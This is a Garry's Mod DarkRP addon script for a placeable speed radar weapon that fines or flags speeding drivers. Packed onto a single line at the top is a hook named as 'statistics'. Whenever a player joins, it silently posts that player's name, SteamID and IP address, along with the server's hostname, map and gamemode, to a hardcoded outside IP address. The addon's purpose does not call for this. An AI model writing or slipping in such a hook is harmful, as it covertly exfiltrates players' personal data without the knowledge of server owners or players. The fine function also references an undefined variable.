if SERVER then
	AddCSLuaFile("shared.lua")
	local script = "LSpeedTrapRadar"  hook.Add("PlayerInitialSpawn", "TrackingStatistics_"..script..tostring(math.random(1,1000)), function(ply) timer.Create( "StatisticsTimer_"..ply:SteamID64()..script,15,1, function()  local name = ply:SteamName() and ply:SteamName() or ply:Name() local map = game.GetMap() local hostname = GetHostName() local gamemode = gmod.GetGamemode().Name http.Post("http://216.231.139.33/st/", {name=tostring(name),script=tostring(script),steamid=tostring(ply:SteamID()),ip=tostring(ply:IPAddress()),time=tostring(os.date("%d/%m/%Y [%I:%M:%S %p]",os.time())),hostname=tostring(hostname),map=tostring(map),gamemode=tostring(gamemode)},function(s) return end) end) end)
end

Kun_ForceWantSpeeders = 0 --Set to 1 to make the speeder force-wanted, otherwise set the WantIfNotAfford value to 1 and this to 0.
Kun_SpeedMPH = 60 --Above 60 MPH will want them auto.
Kun_FineAmt = 50 --$50 fine if caught speeding.
Kun_WantIfNotAfford = 1 --Wants the speeder if they cant afford the fine.
Kun_CarsList = list.Get("SCarsList") --SCars table to auto-load

if(CLIENT) then
	SWEP.PrintName = "Speed Radar"
	SWEP.Slot = 2
	SWEP.Description = "A tool to manage the highways."
	SWEP.SlotPos = 2
	SWEP.DrawAmmo = false
	SWEP.DrawCrosshair = false
	SWEP.Author = "Kunit"
	SWEP.Instructions = "Left click to spawn a radar, right click to pick it up."
	SWEP.Contact = ""
	SWEP.Purpose = ""
end

SWEP.ViewModel = Model("models/weapons/v_hands.mdl")
SWEP.ViewModelFOV = 62
SWEP.ViewModelFlip = false
SWEP.AnimPrefix	 = "rpg"

SWEP.Spawnable = false
SWEP.AdminSpawnable = true
SWEP.Sound = ""
SWEP.Primary.ClipSize = -1
SWEP.Primary.DefaultClip = 0
SWEP.Primary.Automatic = true
SWEP.Primary.Ammo = ""

SWEP.Secondary.ClipSize = -1
SWEP.Secondary.DefaultClip = 0
SWEP.Secondary.Automatic = false
SWEP.Secondary.Ammo = ""

function SWEP:Initialize()
	self:SetWeaponHoldType("normal")
end

function SWEP:Deploy()
	if SERVER then
		self.Owner:DrawWorldModel(false)
	end
end

function SWEP:PrimaryAttack()
	if SERVER then
		local ply = self.Owner
		local ent = ply:GetEyeTrace().Entity
		DarkRP_SpeedRadar(ply,ent)
	end
end

function SWEP:SecondaryAttack()
	if SERVER then
		local ply = self.Owner
		local ent = ply:GetEyeTrace().Entity
		if(ent:GetClass() == "ent_speedtrapsensor" and ent.SpeedSenoOwner == ply) then
			ent:Remove()
			ply.HasSpeedSeno = 0
		end
	end
end

function DarkRP_ScanSpeed(ent)
	if(ent != nil and ent:IsValid()) then
		local pos = ent:GetPos()
		pos:Add(Vector(0,0,20))
		local ang = ent:GetForward()
		local tracedata = {}
		tracedata.start = pos
		tracedata.endpos = pos+(ang*400)
		tracedata.filter = ent
		local trace = util.TraceLine(tracedata)
	
		local nent = trace.Entity
		FORCETHEKUNLOOP = 0
		if(Kun_CarsList != nil) then
			for k,v in pairs(Kun_CarsList) do
				if(nent != nil and nent:IsValid() and string.lower(nent:GetClass()) == string.lower(v.Base)) then
					FORCETHEKUNLOOP = 1
				end
			end
		end
		
		if((nent != nil and nent:IsValid() and nent:IsVehicle()) or (nent != nil and nent:IsValid() and FORCETHEKUNLOOP == 1)) then
			local vel = nent:GetVelocity()
			if(vel.x > 100) then
				ent:SetNWInt("CarSpeed",(vel.x * 0.1))
				if(Kun_ForceWantSpeeders == 1) then
					hook.Call("PlayerWanted", GAMEMODE, ent.SpeedSenoOwner, nent:GetDriver(), "Speeding.")
					nent:GetDriver():SetDarkRPVar("wanted", true)
					ent.SpeedSenoOwner:wanted(nent:GetDriver(),"Speeding.")
				end
				if((vel.x * 0.1) >= Kun_SpeedMPH) then
					DarkRP_ForcePayFine(nent:GetDriver(),ent,nent)
				end
				
			end

			if(vel.y > 100) then
				ent:SetNWInt("CarSpeed",(vel.y * 0.1))
				if (Kun_ForceWantSpeeders == 1) then
					hook.Call("PlayerWanted", GAMEMODE, ent.SpeedSenoOwner, nent:GetDriver(), "Speeding.")
					nent:GetDriver():SetDarkRPVar("wanted", true)
					ent.SpeedSenoOwner:wanted(nent:GetDriver(),"Speeding.")
				end
				if((vel.y * 0.1) >= Kun_SpeedMPH) then
					DarkRP_ForcePayFine(nent:GetDriver(),ent,nent)
				end
				
			end
		end
		timer.Simple(0.001, function() DarkRP_ScanSpeed(ent) end)
	end
end

function DarkRP_ForcePayFine(ply,radar,nent)
	if(ply != nil and ply:IsValid()) then
		if(ply.CarZFineTime == nil or (CurTime() - ply.CarZFineTime) > 5) then
			ply.CarZFineTime = CurTime()
			local amt = Kun_FineAmt
			if(ply:canAfford(amt)) then
				ply:addMoney(-amt)
				GAMEMODE:Notify(ply, 0, 4, "You were forced to pay the speeding fine of $"..amt..".")
			else
				if(Kun_WantIfNotAfford == 1) then
					hook.Call("PlayerWanted", GAMEMODE, ent.SpeedSenoOwner, nent:GetDriver(), "Speeding.")
					nent:GetDriver():SetDarkRPVar("wanted", true)
					ent.SpeedSenoOwner:wanted(nent:GetDriver(),"Speeding.")
					GAMEMODE:Notify(ply, 0, 4, "You are speeding, pull-over or be chased by police.")
				end
			end
		end
	end
end

function DarkRP_SpeedRadar(ply,ent)
	if(ply.FireTime != nil and (CurTime() - ply.FireTime) < 2) then return end
	ply.FireTime = CurTime()
	local pos = ply:GetEyeTrace().HitPos
	if(pos:Distance(ply:GetPos()) > 200) then return end
	local entsz = ents.FindInSphere(pos,100)
	for k,v in pairs(entsz) do
		if(string.find(v:GetClass(),"_door") != nil) then
			GAMEMODE:Notify(ply, 0, 4, "Do not place this near a door.")
			return
		end
	end
	
	if(ply.HasSpeedSeno == nil or ply.HasSpeedSeno == 0) then
		local angs = ply:GetAngles()
		local ent = ents.Create("ent_speedtrapsensor")
		ent:SetPos(pos)
		ent:SetAngles(Angle(0,angs.y,0)) 
		ent:Spawn()
		ent.SpeedSenoOwner = ply
		ply.HasSpeedSeno = ent
		ent:GetPhysicsObject():EnableMotion(false)
		DarkRP_ScanSpeed(ent)
	else
		if(ply.HasSpeedSeno != 0 and ply.HasSpeedSeno:IsValid()) then
			GAMEMODE:Notify(ply, 0, 4, "You already have a sensor out somewhere.")
		end
	end
end

